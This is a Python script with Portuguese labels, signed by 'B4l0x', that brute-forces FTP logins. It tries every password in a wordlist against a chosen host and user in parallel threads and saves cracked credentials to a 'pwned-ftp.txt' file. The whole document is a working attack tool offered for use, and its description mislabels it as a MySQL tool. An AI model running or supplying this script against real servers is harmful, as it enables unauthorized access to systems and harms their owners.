 #!usr/bin/python3
# -*- coding: utf-8 -*-
from ftplib import FTP
import time
import sys
import argparse as arg
import os
import _thread

def banner():
  print("""
  ____             _         ______                   ______ _______ _____  
 |  _ \           | |       |  ____|                 |  ____|__   __|  __ \ 
 | |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___  | |__     | |  | |__) |
 |  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \ |  __|    | |  |  ___/ 
 | |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/ | |       | |  | |     
 |____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___| |_|       |_|  |_|     
                                                                                                                                                                              
 V1.0 Criado por B4l0x - 19/05/2019
""")
banner()

parser = arg.ArgumentParser(description="MySQLi brute force by B4l0x")
parser.add_argument("--wordlist", "-w", help="Wordlist de senhas - DEFAULT: senhas.txt", required=True, default="senhas.txt", type=str)
parser.add_argument("--usuario", "-u", help="Usuario alvo - DEFAULT: www-data", default="www-data", required=False, type=str)
parser.add_argument("--host", "-s", help="Host alvo - DEFAULT: ftp.google.com.br", required=True, default="ftp.google.com.br", type=str)
x = parser.parse_args()

user = x.usuario
server = x.host
tempo = time.strftime("%H:%M:%S")
alocthread = _thread.allocate_lock()

def backspace(n):
    sys.stdout.write((b'\x08' * n).decode()) # use \x08 char to go back

def brute(i):
  ii = i.replace("\n", "")
  try:
    ftp = FTP(server)
    ftp.login(user, ii)
    print("\n\n\t [{} INFO] Pwned: {}@{}:{}\n".format(tempo, server, user, ii))
    arq = open("pwned-ftp.txt", "a")
    arq.write("Host:{} Usuario:{} Senha: {}".format(server, user, ii))
    arq.close()
    ftp.exit()
    exit()
  except:
    alocthread.acquire()
    string = str(" [{} INFO] Incorreta: {}:{}".format(tempo, user, ii))
    sys.stdout.write(string)
    sys.stdout.flush()
    backspace(len(string))
    alocthread.release()

def iniciar():
  try:
    try:
      wordlist = open(x.wordlist, 'r').readlines()
    except:
      print("\n [{} INFO] Verifique o caminho da wordlist e tente novamente...".format(tempo))
      exit()
    for i in wordlist:
      time.sleep(0.1)
      _thread.start_new_thread(brute, (i,))
    print("\n\n\t [{} INFO] Fim do teste, obrigado por usar by B4l0x...\n".format(tempo))
    _thread.exit()
  except KeyboardInterrupt:
    print("\n\n\t [{} INFO] Finalizado, obrigado por usar by B4l0x...\n".format(tempo))
    exit()
    
try:
  ftp = FTP(server)
  ftp.login('b4l0x', 'terrorista')
  ftp.exit()
except Exception as err:
  if(str(err).startswith("530 ")):
    print(" [+] Host recebeu os pacotes")
    print(" [+] Iniciando brute force\n")
    iniciar()
  else:
    #print(err)
    print("\n [!] Verifique servidor e porta e tente novamente, host sem resposta")
    exit()
